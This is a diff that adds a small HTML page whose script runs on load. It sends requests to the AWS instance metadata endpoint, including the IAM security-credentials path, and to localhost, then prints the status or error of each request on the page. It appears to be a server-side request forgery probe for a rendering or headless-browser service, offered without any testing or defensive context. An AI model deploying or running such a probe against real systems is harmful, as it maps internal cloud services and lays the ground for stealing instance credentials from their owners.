@@ -1,0 +1,17 @@
+<html><head><meta charset="utf-8"></head>
+<body><pre id="o" style="font:12px monospace;white-space:pre-wrap">LOADING</pre>
+<script>
+(async()=>{
+ const urls=[
+  'http://169.254.169.254/latest/meta-data/',
+  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+  'http://127.0.0.1/'
+ ];
+ let out='';
+ for(const u of urls){
+  try{const r=await fetch(u,{mode:'no-cors'}); out+='\n['+u+'] HTTP '+r.status+' type='+r.type;}
+  catch(e){out+='\n['+u+'] ERR '+e;}
+ }
+ document.getElementById('o').textContent='RESULT'+out;
+})();
+</script></body></html>
